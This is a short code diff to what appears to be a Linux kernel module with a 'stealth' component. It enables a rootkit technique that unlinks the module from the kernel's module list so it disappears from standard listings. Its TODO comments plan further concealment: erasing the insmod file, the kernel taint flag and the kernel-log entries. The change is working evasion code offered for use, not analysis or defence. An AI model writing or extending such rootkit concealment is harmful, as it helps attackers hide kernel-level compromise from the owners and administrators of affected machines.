@@ -1,9 +1,10 @@
 #include "stealth.h"
 #include "stealth/sanitize_cmdline.h"
+#include <linux/module.h> //struct module (for list_del)
 
 //TODO:
 //https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.0_hiding_lkm/rootkit.c
-//list_del(&THIS_MODULE->list); //Poof! ]:->
+//remove file which was used for insmod
 //remove kernel taint
 //remove module loading from klog
 //delete module file from ramdisk
@@ -30,6 +31,7 @@ int initialize_stealth(void *config2)
 
 #if STEALTH_MODE > STEALTH_MODE_NORMAL
     //These will be STEALTH_MODE_FULL ones
+    list_del(&THIS_MODULE->list);
 #endif
 
     return error;
